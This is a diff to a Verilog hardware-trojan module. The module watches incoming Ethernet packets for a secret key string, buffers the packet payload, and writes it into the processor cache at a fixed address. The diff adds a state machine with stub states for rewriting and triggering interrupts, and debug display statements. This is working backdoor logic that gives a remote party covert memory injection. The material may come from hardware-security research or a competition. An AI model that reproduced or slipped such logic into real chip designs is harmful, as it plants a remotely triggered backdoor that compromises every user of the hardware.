@@ -3,9 +3,20 @@
 
 `define TROJ_CACHE_BASE_ADDR 32'h0020E900
 
+`define IDLE        0
+`define COPY_DATA   1
+`define REWRITE_IRQ 2
+`define TRIGGER_IRQ 3
+`define COMPLETE    4
+
 //NOTE: In order to be successfully matched, the key must start on a word
 //  boundary. This means it should be offset 2 bytes from the start of the UDP
 //  data section. It should also be a multiple of four bytes
+
+// defined in terms of cache lines, each cache line is 4 words
+`define DATA_STORE_SIZE 6
+`define DATA_STORE_BITS (`DATA_STORE_SIZE*128)
+`define DEFAULT_PATTERN 128'h00000000585958595859585958595859
 
 `define SECRET_KEY_0 32'h5f534543 // _SEC
 `define SECRET_KEY_1 32'h5245545f // RET_
@@ -22,108 +33,128 @@ module trojan (
     input wire i_clk,
     input wire i_rst,
 
+    // Ethernet inputs
     input wire [31:0] i_rx_packet_data,
     input wire        i_rx_packet_data_valid,
     input wire        i_rx_packet_reset,
 
+    // Status from cache
     input wire	      i_cache_stall,
 
 	// Write to cache
 	output reg			o_troj,
 	output reg [127:0] 	o_troj_write_data,
-	output reg [31:0]	o_troj_write_addr,
-	output reg [31:0]   o_troj_write_addr_nxt
+	output reg [31:0]	o_troj_write_addr
     );
-
-	reg [15:0]	cache_state;
-	reg [15:0]	cache_state_nxt;
-	
-	wire [127:0] 	troj_data1;
-	wire [127:0]	troj_data2;
-	wire [127:0] 	troj_data3;
-	
-	reg		o_troj_nxt;
-	reg [127:0]	write_data_nxt;
-
-	reg 		stall_reg;
-
-    reg first_time;
-    reg first_time_nxt;
-	
-	assign troj_data1 = 128'h58595859585958595859585958595859;		/// "XYXY..."
-	assign troj_data2 = 128'h58595859585958595859585958595859;
-	assign troj_data3 = 128'h00595859585958595859585958595859;		
-	
-	always @(posedge i_clk) begin
-		if (i_rst) begin
-			o_troj 			<= 1'b0;
-			cache_state 		<= 16'b0;
-			//o_troj_write_data 	<= troj_data1;
-			o_troj_write_data 	<= trojan_data_store;
-			o_troj_write_addr	<= `TROJ_CACHE_BASE_ADDR;
-			stall_reg		<= 1'b0;
-            first_time      <= 1'b1;
-		end
-		else if (o_troj && !i_cache_stall) begin
-			if (!stall_reg) begin
-			    cache_state		<= cache_state_nxt;
-				o_troj_write_data	<= write_data_nxt;
-				o_troj_write_addr	<= o_troj_write_addr_nxt;
-			end else begin
-			    cache_state		<= cache_state;
-				o_troj_write_data	<= write_data_nxt;
-				o_troj_write_addr	<= o_troj_write_addr;
-				stall_reg		<= 1'b0;
-			end
-            o_troj <= o_troj_nxt;
-            first_time <= first_time_nxt;
-		end
-		else begin
-            o_troj <= o_troj_nxt;
-            first_time <= first_time_nxt;
-			cache_state		<= cache_state_nxt;
-			o_troj_write_data	<= write_data_nxt;
-			o_troj_write_addr	<= o_troj_write_addr;
-			stall_reg 		<= 1'b1;
-		end
-	end
-	
-	always @(*) begin
-        o_troj_nxt = o_troj;
-        first_time_nxt = first_time;
-        cache_state_nxt = cache_state;
-
-        if (match_state == `END || first_time) begin
-			cache_state_nxt = cache_state + 1;
-            o_troj_nxt = 1;
-        end
-
-        if (cache_state == 1) begin
-			cache_state_nxt = 0;
-            o_troj_nxt = 0;
-            first_time_nxt = 0;
-        end
-
-        write_data_nxt = trojan_data_store;
-		
-        /*
-		if (o_troj_write_data == troj_data1)
-			write_data_nxt = troj_data2;
-		else if (o_troj_write_data == troj_data2)
-			write_data_nxt = troj_data3;
-		else
-			write_data_nxt = troj_data1;
-        */
-			
-		o_troj_write_addr_nxt = o_troj_write_addr;// + 8'h10;
-	end
     
+    reg       startup;
+    reg       startup_nxt;
+    reg [2:0] trojan_state;
+    reg [2:0] trojan_state_nxt;
+
+    reg         o_troj_nxt;
+    reg [127:0] o_troj_write_data_nxt;
+    reg  [31:0] o_troj_write_addr_nxt;
+
+    reg [2:0] offset;
+    reg [2:0] offset_nxt;
+    reg [`DATA_STORE_BITS-1:0] trojan_data_store;
+    reg [`DATA_STORE_BITS-1:0] trojan_data_store_nxt;
+
+    always @(*) begin
+        startup_nxt = 1'b0;
+        trojan_state_nxt = trojan_state;
+
+        o_troj_nxt = o_troj;
+        o_troj_write_data_nxt = o_troj_write_data;
+        o_troj_write_addr_nxt = o_troj_write_addr;
+
+        offset_nxt = offset;
+        trojan_data_store_nxt = trojan_data_store;
+
+        case (trojan_state)
+            `IDLE: begin
+                if (startup || match_state == `END) begin
+                    // We should copy data over to the stack
+                    trojan_state_nxt = `COPY_DATA;
+
+                    o_troj_nxt = 1'b1;
+                    o_troj_write_data_nxt = trojan_data_store[127:0];
+                    o_troj_write_addr_nxt = `TROJ_CACHE_BASE_ADDR;
+
+                    offset_nxt = offset+1;
+                    trojan_data_store_nxt = {`DEFAULT_PATTERN, trojan_data_store[`DATA_STORE_BITS-1:128]};
+                end else begin
+                    // Not ready yet, buffer ethernet data if valid
+                    trojan_data_store_nxt = trojan_data_store;
+                    if (trojan_data_valid) begin
+                        trojan_data_store_nxt = {trojan_data, trojan_data_store[`DATA_STORE_BITS-1:32]};
+                    end
+                end
+            end
+            `COPY_DATA: begin
+                if (!i_cache_stall) begin
+                    // Copy complete!
+                    if (offset < `DATA_STORE_SIZE) begin
+                        // Move to next data
+                        o_troj_write_data_nxt = trojan_data_store[127:0];
+                        o_troj_write_addr_nxt = o_troj_write_addr+32'h00000010;
+
+                        offset_nxt = offset+1;
+                        trojan_data_store_nxt = {`DEFAULT_PATTERN, trojan_data_store[`DATA_STORE_BITS-1:128]};
+                    end else begin
+                        // All data copied
+                        trojan_state_nxt = `COMPLETE;
+
+                        o_troj_nxt = 1'b0;
+
+                        offset_nxt = 2'b0;
+                    end
+                end
+            end
+            `REWRITE_IRQ: begin
+
+            end
+            `TRIGGER_IRQ: begin
+
+            end
+            `COMPLETE: begin
+                // Copy complete. Reset state machine
+                trojan_state_nxt = `IDLE;
+            end
+
+        endcase
+
+    end
+
+    always @(posedge i_clk) begin
+        if (i_rst) begin
+            startup     <= 1'b1;
+            trojan_state <= `IDLE;
+
+            o_troj <= 1'b0;
+            o_troj_write_data <= 128'h58595859585958595859585958595859; /// "XYXY..."
+            o_troj_write_addr <= `TROJ_CACHE_BASE_ADDR;
+
+            offset <= 2'b0;
+            trojan_data_store <= {`DATA_STORE_SIZE{`DEFAULT_PATTERN}}; /// "XYXY..."
+
+        end else begin
+            startup <= startup_nxt;
+            trojan_state <= trojan_state_nxt;
+
+            o_troj <= o_troj_nxt;
+            o_troj_write_data <= o_troj_write_data_nxt;
+            o_troj_write_addr <= o_troj_write_addr_nxt;
+
+            offset <= offset_nxt;
+            trojan_data_store <= trojan_data_store_nxt;
+        end
+    end
 
     // Ethernet stuff
     reg [31:0] trojan_data;
     reg        trojan_data_valid;
-    reg [128-1:0] trojan_data_store;
-    reg [128-1:0] trojan_data_store_nxt;
 
     // signals for watching ethernet RX
     reg [2:0] match_state;
@@ -179,10 +210,6 @@ module trojan (
             endcase
         end
 
-        trojan_data_store_nxt = trojan_data_store;
-        if (trojan_data_valid) begin
-            trojan_data_store_nxt = {trojan_data, trojan_data_store[128-1:32]};
-        end
     end
 
     always @(posedge i_clk) begin
@@ -194,8 +221,6 @@ module trojan (
             buffered_data <= 32'h0;
             buffered_valid <= 0;
 
-            trojan_data_store <= 128'h58595859585958595859585958595859;		/// "XYXY..."
-
         end else begin
             trojan_data <= buffered_data;
             trojan_data_valid <= buffered_valid;
@@ -203,8 +228,6 @@ module trojan (
             match_state <= match_state_nxt;
             buffered_data <= buffered_data_nxt;
             buffered_valid <= buffered_valid_nxt;
-
-            trojan_data_store <= trojan_data_store_nxt;
 
         end
     end
@@ -219,13 +242,31 @@ module trojan (
             );
         end
 
+        if (i_rst) begin
+            $display("Initial Status");
+            $display("Trojan Data Store[0]: 0x%X", trojan_data_store[127:0]);
+            $display("Trojan Data Store[1]: 0x%X", trojan_data_store[255:128]);
+            $display("Trojan Data Store[2]: 0x%X", trojan_data_store[383:256]);
+            $display("Trojan Data Store[3]: 0x%X", trojan_data_store[511:384]);
+            $display("Trojan Data Store[4]: 0x%X\n", trojan_data_store[639:512]);
+        end
+
         if (!i_rst && trojan_data_valid) begin
             $display("Trojan Data: 0x%X\n", trojan_data);
+            $display("Trojan Data Store[0]: 0x%X", trojan_data_store[127:0]);
+            $display("Trojan Data Store[1]: 0x%X", trojan_data_store[255:128]);
+            $display("Trojan Data Store[2]: 0x%X", trojan_data_store[383:256]);
+            $display("Trojan Data Store[3]: 0x%X", trojan_data_store[511:384]);
+            $display("Trojan Data Store[4]: 0x%X\n", trojan_data_store[639:512]);
         end
 
         if (!i_rst && o_troj) begin
-            $display("Cache State: %d  addr[0x%X]=0x%X\n", cache_state, o_troj_write_addr, o_troj_write_data);
-            $display("Trojan Data Store: 0x%X\n", trojan_data_store);
+            $display("State: %d  addr[0x%X]=0x%X\n", trojan_state, o_troj_write_addr, o_troj_write_data);
+            $display("Trojan Data Store[0]: 0x%X", trojan_data_store[127:0]);
+            $display("Trojan Data Store[1]: 0x%X", trojan_data_store[255:128]);
+            $display("Trojan Data Store[2]: 0x%X", trojan_data_store[383:256]);
+            $display("Trojan Data Store[3]: 0x%X", trojan_data_store[511:384]);
+            $display("Trojan Data Store[4]: 0x%X\n", trojan_data_store[639:512]);
         end
     end
 endmodule
